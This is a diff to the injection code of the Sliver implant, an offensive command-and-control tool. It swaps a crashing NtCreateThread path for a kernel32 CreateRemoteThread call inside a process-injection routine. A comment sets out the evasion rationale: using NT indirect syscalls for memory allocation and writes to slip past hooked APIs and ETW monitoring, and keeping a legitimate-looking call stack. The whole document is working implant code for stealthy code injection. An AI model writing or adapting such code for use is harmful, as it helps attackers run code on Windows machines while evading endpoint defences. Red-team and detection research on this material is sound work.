@@ -53,6 +53,7 @@ import (
 	"log"
 	//{{end}}
 
+	"github.com/bishopfox/sliver/implant/sliver/syscalls"
 	"golang.org/x/sys/windows"
 )
 
@@ -247,10 +248,23 @@ func NTInjectTask(processHandle windows.Handle, data []byte, rwxPages bool) (win
 		}
 	}
 
-	// 4. Thread
-	threadHandle, err = NtCreateThreadRemote(processHandle, remoteAddr)
+	// 4. Thread — kernel32 CreateRemoteThread.
+	//
+	// Empirical note (PERSEFONE, 2026-08-18): the full-NT path with a
+	// frame-builder stub for NtCreateThread (8 args) crashed post-syscall
+	// (ret landed on a bogus address) — needs runtime hexdump debugging
+	// before it can ship. alloc/write/protect via NT indirect syscalls is
+	// where the ETW/hook surface actually lives (VirtualAllocEx /
+	// WriteProcessMemory / VirtualProtectEx are the exported, hooked
+	// primitives), and those are proven green. CreateRemoteThread via
+	// kernel32 leaves a clean legitimate call stack, so the hybrid keeps
+	// ~90% of the evasion value with a fraction of the risk.
+	attr := new(windows.SecurityAttributes)
+	var lpThreadId uint32
+	threadHandle, err = syscalls.CreateRemoteThread(
+		processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
 	if err != nil {
-		return 0, fmt.Errorf("NtCreateThread: %w", err)
+		return 0, fmt.Errorf("CreateRemoteThread: %w", err)
 	}
 
 	//{{if .Config.Debug}}
